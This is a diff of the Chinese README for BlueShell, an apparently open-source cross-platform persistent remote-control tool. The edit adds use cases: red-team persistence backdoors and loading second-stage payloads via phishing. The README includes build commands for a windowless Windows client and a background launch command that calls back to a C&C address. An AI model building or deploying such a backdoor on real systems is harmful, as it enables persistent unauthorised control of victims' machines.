@@ -1,10 +1,14 @@
 BlueShell
 ===
-BlueShell是一个跨平台的持续远控工具，拿下靶机后部署BlueShell Client端，Client端会每隔固定时间向C&C Server发起反弹连接尝试，Server启动并连接Client端后，即可实现对靶机的持续控制，目前支持的主要功能有：
+BlueShell是一个跨平台的持续远控工具，拿下靶机后，根据操作系统版本下载部署对应的bsClient，其会每隔固定时间向指定的C&C地址发起反弹连接尝试，在C&C端运行bsServer即可连接bsClient，从而实现对靶机的持续控制，主要适用场景：
++ 红蓝对抗中的持久化后门或内网代理
++ 社工钓鱼二次加载Payload
+
+目前支持的主要功能有：
 + 循环持续控制
 + 跨平台，支持Linux、Windows、MacOS
 + 交互式Shell反弹（Windows只支持普通反弹Shell）
-+ Socks5反弹代理
++ Socks5代理反弹
 + 文件上传、下载
 + TLS通信加密
 
@@ -30,7 +34,7 @@ go get golang.org/x/crypto/ssh/terminal
 go build --ldflags "-s -w " -o bsServer server.go
 ```
 ### Windows
-生成client
+生成bsClient
 ```shell script
 go get github.com/armon/go-socks5
 go get github.com/creack/pty
@@ -48,7 +52,7 @@ go build --ldflags "-s -w -H=windowsgui" -o bsClient.exe client.go
 ```shell script
 start /b bsClient.exe
 ```
-参数模式启动,-h指定远控端地址，-p远控端监听端口,-t尝试连接远控的间隔秒数
+参数模式启动,-h指定远控端地址，-p指定远控端监听端口,-t指定尝试连接远控的间隔秒数
 ```shell script
 start /b bsClient.exe -h 10.0.0.1 -p 443 -t 10
 ```
